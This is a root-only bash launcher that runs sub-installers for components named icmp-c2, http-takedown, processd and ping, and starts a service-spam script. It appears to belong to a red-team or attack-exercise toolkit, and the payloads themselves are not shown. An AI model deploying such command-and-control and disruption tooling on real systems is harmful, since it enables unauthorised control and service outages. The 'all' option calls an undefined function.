#!/bin/bash
WHICH="$1"
ROOT_PATH="$(dirname $( realpath "$0"  ))"

if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi

echo "Dirname: $ROOT_PATH"
echo "Which: $WHICH"


httpTakedown () {
    cd "$ROOT_PATH/http-takedown"
    chmod +x ./install.sh
    ./install.sh
}

icmpC2 () {
    cd "$ROOT_PATH/icmp-c2"
    chmod +x ./install.sh
    ./install.sh
}

ping_install () {
    cd "$ROOT_PATH/ping"
    chmod +x ./install.sh
    ./install.sh
}

processd () {
    cd "$ROOT_PATH/processd"
    chmod +x ./install.sh
    ./install.sh
}

serviceSpam () {
    cd "$ROOT_PATH/service-spam"
    python3 service.py
}


if [[ "$WHICH" == "all" ]]; then
    # Currently debugging installer script
    install
    icmpC2
    ping_install
    processd
    httpTakedown
    serviceSpam
fi
if [[ "$WHICH" == "icmp" ]]; then
    icmpC2
fi
if [[ "$WHICH" == "ping" ]]; then
    ping_install
fi
if [[ "$WHICH" == "processd" ]]; then
    processd
fi
if [[ "$WHICH" == "services" ]]; then
    serviceSpam
fi
